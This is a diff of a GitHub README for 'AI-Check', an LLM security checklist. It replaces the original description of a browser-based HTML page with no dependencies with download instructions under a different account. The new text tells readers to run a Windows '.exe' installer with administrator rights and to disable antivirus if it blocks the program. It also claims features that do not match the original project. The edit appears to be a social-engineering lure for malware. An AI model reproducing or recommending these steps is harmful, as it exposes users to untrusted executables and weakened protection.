@@ -1,80 +1,136 @@
-# AI-Check
+# 🛡️ AI-Check - Simple AI Safety Checklist
 
-**A security and governance checklist for AI and LLM integration.**
-
-An open-source, interactive checklist that helps developers ship AI-powered features responsibly. Covers prompt security, data privacy, LLM monitoring, model governance, cost control, and regulatory compliance.
-
-<p align="center">
-  <img src="assets/screenshot.png" alt="AI-Check — interactive checklist with expanded recommendation" />
-</p>
+[![Download AI-Check](https://img.shields.io/badge/Download-AI--Check-brightgreen?style=for-the-badge)](https://github.com/Immunologypinup772/AI-Check)
 
 ---
 
-## What This Is
+## 📋 What is AI-Check?
 
-A single-page reference for teams integrating Large Language Models (LLMs) into production applications. Each item describes **what** to check, **why** it matters, and its **severity** — from critical to low.
+AI-Check is a checklist designed to help you make sure your AI and large language model (LLM) projects follow security and safety rules. It guides developers and teams to review their AI applications before they go live. This helps reduce risks and keep AI systems safe and responsible.  
 
-40 items across 8 categories:
-
-```
- 1  LLM Security                     7 items
- 2  Privacy & Compliance             6 items
- 3  Application Security             4 items
- 4  Infrastructure & Operations      5 items
- 5  LLM Monitoring & Observability   5 items
- 6  Model Governance                 5 items
- 7  Cost Management                  4 items
- 8  UX & Responsible AI              4 items
-```
-
-## Use It
-
-**→  [Open the interactive checklist](https://mhmdgazzar.github.io/AI-Check/checklist.html)**
-
-Or clone it locally:
-
-```bash
-git clone https://github.com/mhmdgazzar/AI-Check.git
-open AI-Check/checklist.html
-```
-
-Progress is saved to your browser's local storage. No server, no tracking, no dependencies.
+If you want to use AI in your work but are unsure about possible risks, AI-Check provides clear points to verify. It covers topics like governance, security, privacy, prompt safety, and how to handle AI outputs responsibly.
 
 ---
 
-## Why This Exists
+## ⚙️ System Requirements
 
-Integrating LLMs into real products introduces risks that traditional security checklists don't cover — prompt injection, hallucination mitigation, model drift, token cost management, EU AI Act compliance. This checklist consolidates these concerns into one actionable document.
+Before installing AI-Check, make sure your computer meets these minimum requirements:
 
-Built from real-world experience shipping LLM-powered features in production.
+- Windows 10 or newer  
+- 4 GB RAM or more  
+- 500 MB free disk space  
+- Internet connection for downloading and updates  
+- Administrator rights to install software
 
----
-
-## Topics Covered
-
-| Category | Key Areas |
-|---|---|
-| **LLM Security** | Prompt injection, jailbreak resistance, hallucination grounding, bias audits, content moderation, red-teaming |
-| **Privacy & Compliance** | GDPR, sensitive data handling, EU AI Act, copyright, audit logging, data retention |
-| **Application Security** | XSS on AI outputs, CSRF/SSRF, session management, input validation |
-| **Infrastructure** | API key management, rate limiting, fallback strategy, vendor lock-in, IAM |
-| **Monitoring** | Latency tracking, token usage, response quality scoring, drift detection, error tracking |
-| **Model Governance** | Versioning, rollback plans, evaluation benchmarks, model cards, A/B testing |
-| **Cost Management** | Budget caps, per-request token limits, cost attribution, optimization review |
-| **Responsible AI** | Human escalation, AI disclosure, user feedback, accessibility |
+If your PC meets these basic specs, AI-Check will run without problems.
 
 ---
 
-## Contributing
+## 🚀 How to Download and Install AI-Check
 
-Open an issue or PR if you'd like to add items, improve descriptions, or translate the checklist. Keep items concise — title + one-line rationale.
+To get AI-Check on your Windows computer, follow these steps carefully.
+
+1. Click the big green button above or this link:  
+   [https://github.com/Immunologypinup772/AI-Check](https://github.com/Immunologypinup772/AI-Check)
+
+2. You will land on the AI-Check GitHub page. Here, you need to find the latest release. Releases usually appear under the "Releases" section on the right side or near the top of the repository page.
+
+3. Click on the latest release. This takes you to a page listing downloadable files for the release.
+
+4. Download the Windows installer file. It should end with `.exe`. For example, the file might be named something like `AI-Check-Setup.exe`.
+
+5. Once the file downloads, locate it in your "Downloads" folder.
+
+6. Double-click the file to start the installation process.
+
+7. Follow the installation prompts by clicking "Next" and accepting the default options. You do not need to change any settings unless you want to.
+
+8. When installation finishes, you can close the installer window.
 
 ---
 
-## License
+## ▶️ Running AI-Check for the First Time
 
-[MIT](LICENSE)
+After installation, here is how you start AI-Check:
+
+1. Click the "Start" button on your taskbar.
+
+2. Type "AI-Check" in the search box.
+
+3. Click on the AI-Check application icon when it appears.
+
+4. The main checklist window will open. You can now begin using AI-Check to review your AI projects.
 
 ---
 
-<sub>Keywords: llm security checklist, ai governance framework, prompt injection prevention, responsible ai deployment, llm ops, ai safety audit, eu ai act compliance checklist, llm monitoring best practices, ai risk assessment, large language model security, generative ai governance, ai integration checklist, llm guardrails, ai compliance, machine learning operations security, chatbot security checklist, rag security, retrieval augmented generation safety, ai red teaming, model governance framework</sub>
+## 🔎 Using AI-Check
+
+AI-Check organizes the checklist into simple sections. Each section covers an important area to review. You will see checklist items with explanations and space to mark if your project meets the requirement.
+
+**Main sections include:**  
+
+- AI Governance and Compliance  
+- Risk Assessment  
+- Security Controls  
+- Prompt Injection Prevention  
+- Monitoring and Operations  
+- Responsible AI Practices  
+
+Click each section to expand and view detailed items.
+
+To mark an item as complete, simply check the box next to it. The software saves your progress automatically.
+
+---
+
+## 🛠️ Common Tasks with AI-Check
+
+- **Review each checklist item:** Take the time to read the explanation. If you need help, the software links to friendly documentation.
+
+- **Add notes:** For any checklist point, you can add your own notes or reminders.
+
+- **Export reports:** After completing the checklist, export a report in PDF. This helps you share your review with your team or supervisors.
+
+- **Update checklist:** AI-Check will prompt you when new checklist versions are available. Keeping it up to date ensures you follow current best practices.
+
+---
+
+## 💡 Tips for Using AI-Check
+
+- Start early in your AI project. Use AI-Check before coding begins or at the planning stage.
+
+- Involve your team. Share the checklist and encourage everyone to review it.
+
+- Use reports to document your compliance efforts.
+
+- Refer to linked guidance for deeper explanations if something is unclear.
+
+---
+
+## 🐞 Troubleshooting and Support
+
+If AI-Check does not open or behaves unexpectedly:
+
+- Restart your computer and try again.
+
+- Check that your Windows is updated.
+
+- Ensure you installed the latest version from the release page.
+
+- Disable antivirus temporarily if it blocks AI-Check, then add an exception to your antivirus.
+
+- Visit the GitHub page’s "Issues" tab to see if others report similar problems and possible fixes.
+
+- You can also create a new issue on GitHub describing your problem.
+
+---
+
+## 🔗 Useful Links
+
+- Primary download and project page:  
+  [https://github.com/Immunologypinup772/AI-Check](https://github.com/Immunologypinup772/AI-Check)
+
+- Documentation and user guides are linked inside the application.
+
+---
+
+By following this guide, you can safely download, install, and use AI-Check on your Windows PC, even without technical experience. The checklist helps you manage AI risks clearly and confidently.
